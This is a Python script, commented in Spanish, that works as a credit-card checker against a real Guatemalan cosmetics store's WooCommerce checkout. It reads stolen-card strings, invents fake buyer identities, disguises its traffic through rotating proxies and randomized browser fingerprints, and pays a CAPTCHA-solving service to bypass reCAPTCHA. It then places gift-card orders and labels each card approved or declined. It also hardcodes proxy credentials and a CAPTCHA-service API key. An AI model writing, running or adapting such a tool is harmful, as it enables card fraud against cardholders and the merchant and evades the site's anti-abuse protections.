import requests
from faker import Faker
import re
import unicodedata
fake = Faker('es_ES')
from datetime import datetime, timedelta
import time

import random

def _ascii(texto):
    sin_tildes = unicodedata.normalize('NFKD', texto).encode('ascii', 'ignore').decode('ascii')
    return re.sub(r'[^a-z0-9]', '', sin_tildes.lower())

proxy_url = "http://qaxtdvtr-GT-rotate:cpyp473gyvje@p.webshare.io:80"

proxies_config = {
    "http": proxy_url,
    "https": proxy_url
}


session = None


def generar_numero_aleatorio():
    """Genera número de teléfono USA: +1 (XXX) XXX-XXXX"""
    area_code = random.randint(200, 999)  # XXX
    exchange = random.randint(200, 999)   # XXX
    subscriber = random.randint(1000, 9999)  # XXXX
    return f"+1 ({area_code}) {exchange}-{subscriber}"



def generar_datos_aleatorios():
    """Genera un diccionario con metadatos y datos de usuario aleatorios"""
    
    # 1. Generar nombres, apellidos y correos dinámicos
    nombre = fake.first_name()
    apellido = fake.last_name()
    # Genera un correo aleatorio basado en el nombre
    email = f"{_ascii(nombre)}{_ascii(apellido)}{random.randint(10, 999)}@gmail.com"
    
    # 2. Generar un NIT o identificación aleatoria (formato común en GT)
    nit_aleatorio = f"{random.randint(100000, 9999999)}-{random.randint(0, 9)}"
    
    # 3. Aleatorizar tiempos de sesión para que no tengan la misma estampa
    tiempo_actual = datetime.now() - timedelta(minutes=random.randint(1, 15))
    session_start_time = tiempo_actual.strftime("%Y-%m-%d+%H:%M:%S")
    session_pages = str(random.randint(3, 12))
    
    # 4. Cambiar ligeramente versiones de User-Agent y valores Sec-Ch-Ua
    chrome_version = str(random.randint(140, 148))
    user_agent = f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36'
    sec_ch_ua = f'"Chromium";v="{chrome_version}", "Google Chrome";v="{chrome_version}", "Not/A)Brand";v="99"'

    return {
        "nombre": nombre,
        "apellido": apellido,
        "email": email,
        "nit": nit_aleatorio,
        "session_start_time": session_start_time,
        "session_pages": session_pages,
        "user_agent": user_agent,
        "sec_ch_ua": sec_ch_ua
    }
nombre = apellido = correo = nit = session_start = session_pages = user_agent = sec_ch_ua = None



def addcart():

    url = "https://beautydepot.com.gt/?wc-ajax=ip_add_to_cart"

    files = {
        "ywgc_has_custom_design": (None, "1"),
        "ywgc-is-digital": (None, "1"),
        "gift_amounts": (None, "100"),
        "ywgc-recipient-name[]": (None, nombre),
        "ywgc-recipient-email[]": (None, correo),
        "ywgc-edit-message": (None, "hola"),
        "ywgc-sender-name": (None, "jimena"),
        "quantity": (None, "1"),
        "add-to-cart": (None, "46281"),
        "product_id": (None, "46281"),
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'es-ES,es;q=0.9',
        'Connection': 'keep-alive',
        'Origin': 'https://beautydepot.com.gt',
        'Referer': 'https://beautydepot.com.gt/producto/ecotools-fresh-perfecting-blender/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': user_agent,
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': sec_ch_ua,
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    response = session.post(url=url, files=files, headers=headers)

    data = response.json()
    hashid = data["cart_hash"]
    print(f"hashid: {hashid}")


def getnonce():
    url = "https://beautydepot.com.gt/checkout/"

    res = session.get(url=url)
    html = res.text

    import re
    match = re.search(r'id="woocommerce-process-checkout-nonce"[^>]*value="([^"]+)"', html)
    if match:
        nonce = match.group(1)
        print(f"Nonce: {nonce}")
        return nonce
    print("Nonce no encontrado")
    return None



def checkout(tokencap,nonce,ccnumber,mes,ano,cvv):
    url = "https://beautydepot.com.gt/?wc-ajax=checkout"

    headers = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'es-ES,es;q=0.9',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://beautydepot.com.gt',
    'Referer': 'https://beautydepot.com.gt/checkout/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': user_agent,
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': sec_ch_ua,
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    }

    data = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fbeautydepot.com.gt%2Fcarro-de-compras%2F&wc_order_attribution_session_start_time={session_start}&wc_order_attribution_session_pages={session_pages}&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F148.0.0.0+Safari%2F537.36&billing_first_name={nombre}&billing_last_name={apellido}&billing_nit={nit}&billing_company=&billing_country=GT&billing_address_1=75+Street+Road&billing_address_2=&billing_city=Warminster&billing_state=GT-CM&billing_postcode=18974&billing_phone={generar_numero_aleatorio()}&billing_email={correo}&billing_birthday=2000-12-25&order_comments=&coupon_code=&g-recaptcha-response={tokencap}&payment_method=cybs&cybs-card-number={ccnumber}&cybs-card-expiry={mes}+%2F+{ano}&cybs-card-cvc={cvv}&cybs-card-name=Mario+Ruiz&terms=on&terms-field=1&woocommerce-process-checkout-nonce={nonce}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review'

    import re
    
    response = session.post(url=url, headers=headers,data=data)
    print(f"Code: {response.status_code}")
    data_res = response.json()
    messages_html = data_res.get("messages", "")
    mensaje = re.sub(r"<[^>]+>", "", messages_html).strip()
    print(f"Resultado: {mensaje}")
    print (messages_html)
    if "failure" in mensaje:
        mensajes = "Rechazada"
        print("Charged")
        return mensajes
    if "CVV no valido" in mensaje:
        mensajes = "Aprovada"
        print("CCN")
        return mensajes
    if "success" in mensaje:
        mensajes = "Aprovada"
        print("Charged")
        return mensajes
    if not mensaje:
        mensajes = "Aprovada"
        print("Charged")
        return mensajes
    return mensaje




def sendtask():
    url = "https://api.capsolver.com/createTask"
    headers={
        "Content-Type": "application/json"


    }
    payload = {
    "clientKey": "CAP-E628130ED40FD0A0BBC180D0C7822D2C3B13D9BAAE3152A7F7A15F473A4F852F",
    "task": {
        "type": "ReCaptchaV2Task",
        "websiteURL": "https://beautydepot.com.gt/checkout/",
        "websiteKey": "6LerJiAqAAAAAL_jCHOd1az0bj0pT_ntaJONzaF9",
        }
    }


    res = requests.post(url=url, json=payload, headers=headers)

    print(res.text)

    data = res.json()
    hashid = data["taskId"]
    print(f"hashid: {hashid}")
    return hashid

    

import time
api_key = "CAP-E628130ED40FD0A0BBC180D0C7822D2C3B13D9BAAE3152A7F7A15F473A4F852F"  # your api key of capsolver
site_key = "6LerJiAqAAAAAL_jCHOd1az0bj0pT_ntaJONzaF9"  # site key of your target site
site_url = "https://beautydepot.com.gt/checkout/"  # page url of your target site
 



def gettaskresult(taskid):
    url = "https://api.capsolver.com/getTaskResult"
    headers = {
        "Content-Type": "application/json"
    }
    payload = {
        "clientKey": "CAP-E628130ED40FD0A0BBC180D0C7822D2C3B13D9BAAE3152A7F7A15F473A4F852F",
        "taskId": taskid
    }

    while True:
        res = requests.post(url=url, json=payload, headers=headers)
        data = res.json()
        status = data.get("status")
        print(f"Status: {status}")
        if status == "ready":
            token = data["solution"]["gRecaptchaResponse"]
            print(f"Token: ")
            return token
        elif status == "failed":
            print(f"Task failed: {data}")
            return None
        time.sleep(3)




def procesar_datos_tarjeta(cadena_texto):
    """
    Toma una cadena formato 'numero|mes|año|cvv'
    y devuelve las variables formateadas individualmente.
    """
    try:
        # 1. Separar el texto usando el caracter '|'
        partes = cadena_texto.strip().split('|')
        
        # Validar que tenga los 4 elementos requeridos
        if len(partes) != 4:
            print("❌ El formato de la tarjeta no es válido. Debe ser numero|mes|año|cvv")
            return None, None, None, None
            
        numero_puro = partes[0]
        mes = partes[1]
        ano = partes[2]
        cvv = partes[3]
        
        # 2. Dividir el número en grupos de 4 separados por espacio
        # Esto toma bloques de 4 en 4: de 0-4, 4-8, 8-12, 12-16
        numero_formateado = f"{numero_puro[0:4]} {numero_puro[4:8]} {numero_puro[8:12]} {numero_puro[12:16]}"
        
        # Si el año viene completo (ej: 2026), extraemos solo los últimos 2 dígitos (ej: 26)
        if len(ano) == 4:
            ano = ano[2:]
            
        return numero_formateado, mes, ano, cvv

    except Exception as e:
        print(f"❌ Error al procesar la línea de la tarjeta: {e}")
        return None, None, None, None




def neonetrun(cardstring):
    global session, nombre, apellido, correo, nit, session_start, session_pages, user_agent, sec_ch_ua
    session = requests.Session()
    session.proxies.update(proxies_config)
    datos = generar_datos_aleatorios()
    nombre = datos['nombre']
    apellido = datos['apellido']
    correo = datos['email']
    nit = datos['nit']
    session_start = datos['session_start_time']
    session_pages = datos['session_pages']
    user_agent = datos['user_agent']
    sec_ch_ua = datos['sec_ch_ua']
    print(correo)

    ccnumber, mes, ano, cvv = procesar_datos_tarjeta(cardstring)
    addcart()
    nonce = getnonce()
    taskid = sendtask()
    token = gettaskresult(taskid)
    response = checkout(token, nonce, ccnumber, mes, ano, cvv)
    return response













# ccnumbers = input("Ingresa el numero de tarjeta ")
# ccnumber,mes,ano,cvv = procesar_datos_tarjeta(ccnumbers)
# print(ccnumbers)
# addcart()
# nonce = getnonce()
# taskid = sendtask()
# token = gettaskresult(taskid)
# nombre = "michael"
# apellido = "Juares"
# checkout(token, nonce,ccnumber,mes,ano,cvv)

